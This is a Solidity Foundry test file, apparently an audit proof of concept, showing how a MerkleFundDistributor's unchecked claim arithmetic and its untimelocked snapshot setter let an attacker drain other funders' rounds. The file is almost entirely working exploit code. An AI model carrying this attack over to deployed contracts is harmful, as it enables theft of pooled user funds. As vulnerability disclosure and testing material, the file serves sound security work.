// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";

import {MerkleFundDistributor} from "src/merkle/MerkleFundDistributor.sol";
import {TestUSDC} from "src/tokens/TestUSDC.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice A snapshot stand-in whose `getLatestState` the owner controls.
contract PassAFakeSnapshot {
    IMerkleSnapshot.MerkleState internal _state;

    function set(bytes32 root, uint256 totalValue) external {
        _state = IMerkleSnapshot.MerkleState({
            blockNumber: block.number,
            timestamp: block.timestamp,
            root: root,
            ipfsHash: bytes32(uint256(1)),
            ipfsHashCid: "cid",
            totalValue: totalValue
        });
    }

    function getLatestState() external view returns (IMerkleSnapshot.MerkleState memory) {
        return _state;
    }
}

/// @notice PASS A PoC.
///
/// `MerkleFundDistributor.claim` computes
///   `claimedAmount = mulDiv(amountFunded - feeAmount, value, totalMerkleValue)`
/// and never checks `amountDistributed + claimedAmount <= amountFunded - feeAmount`. All
/// distributions of a token share one contract balance, so a single distribution whose leaf
/// values sum above its own `totalMerkleValue` pays itself out of OTHER funders' rounds.
///
/// The owner reaches that state with one instant, un-timelocked call: `setMerkleSnapshot`.
/// (Fee INCREASES are delayed by `FEE_INCREASE_DELAY`; the snapshot pointer, which is strictly
/// more powerful, is not.)
contract OmegaPassA_DistributorSolvency is Test {
    MerkleFundDistributor internal dist;
    PassAFakeSnapshot internal honest;
    PassAFakeSnapshot internal evil;
    TestUSDC internal token;

    address internal owner = address(this);
    address internal funder = address(0xF00D);
    address internal victim = address(0x1CE);
    address internal attacker = address(0xBAD);

    bytes32 internal honestRoot;
    bytes32 internal evilRoot;

    function setUp() public {
        token = new TestUSDC();
        honest = new PassAFakeSnapshot();
        evil = new PassAFakeSnapshot();

        // Honest round: a two-leaf tree, victim holds all 1_000_000 of the value.
        honestRoot = _leaf(victim, 1_000_000);
        honest.set(honestRoot, 1_000_000);

        // Attacker round: a single-leaf tree claiming 1_000_000 units against totalValue 1.
        evilRoot = _leaf(attacker, 1_000_000);
        evil.set(evilRoot, 1);

        dist = new MerkleFundDistributor(owner, address(honest), owner, 0, false);

        token.mint(funder, 1_000_000);
        vm.prank(funder);
        token.approve(address(dist), type(uint256).max);
        token.mint(attacker, 1);
        vm.prank(attacker);
        token.approve(address(dist), type(uint256).max);
    }

    function _leaf(address account, uint256 value) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(account, value))));
    }

    function test_PassA_OwnerRepointsSnapshotAndDrainsAnotherFundersRound() public {
        // 1. An unrelated funder funds a real round against the proven root.
        vm.prank(funder);
        uint256 honestIndex = dist.distribute(address(token), 1_000_000, honestRoot);
        assertEq(token.balanceOf(address(dist)), 1_000_000);

        // 2. The owner re-points the snapshot. No delay, no notice, no event consumers can act on.
        dist.setMerkleSnapshot(address(evil));

        // 3. Anyone (allowlist is off by default in every factory-minted fund) opens a 1-unit
        //    round against the crafted (root, totalValue=1) pair.
        vm.prank(attacker);
        uint256 evilIndex = dist.distribute(address(token), 1, evilRoot);

        // 4. One leaf whose `value` exceeds `totalMerkleValue` pays out 1_000_000x its funding.
        bytes32[] memory noProof = new bytes32[](0);
        uint256 got = dist.claim(evilIndex, attacker, 1_000_000, noProof);
        assertEq(got, 1_000_000, "claim scaled past the round's own funding");
        assertEq(token.balanceOf(attacker), 1_000_000);

        // 5. The honest round is now insolvent: the victim's legitimate claim reverts.
        assertEq(token.balanceOf(address(dist)), 1, "distributor drained");
        vm.expectRevert();
        dist.claim(honestIndex, victim, 1_000_000, noProof);
    }

    /// The bookkeeping itself is what is broken: a distribution can report more distributed than
    /// it was ever funded, and `sweep` then underflows.
    function test_PassA_AmountDistributedExceedsAmountFunded() public {
        vm.prank(funder);
        dist.distribute(address(token), 1_000_000, honestRoot);
        dist.setMerkleSnapshot(address(evil));
        vm.prank(attacker);
        uint256 evilIndex = dist.distribute(address(token), 1, evilRoot, uint64(block.timestamp + 1 days));

        bytes32[] memory noProof = new bytes32[](0);
        dist.claim(evilIndex, attacker, 1_000_000, noProof);

        MerkleFundDistributor.DistributionState memory d = dist.getDistribution(evilIndex);
        assertEq(d.amountFunded, 1);
        assertEq(d.amountDistributed, 1_000_000, "distributed > funded, unchecked");

        vm.warp(block.timestamp + 2 days);
        vm.expectRevert(); // arithmetic underflow in `amountFunded - feeAmount - amountDistributed`
        dist.sweep(evilIndex);
    }
}
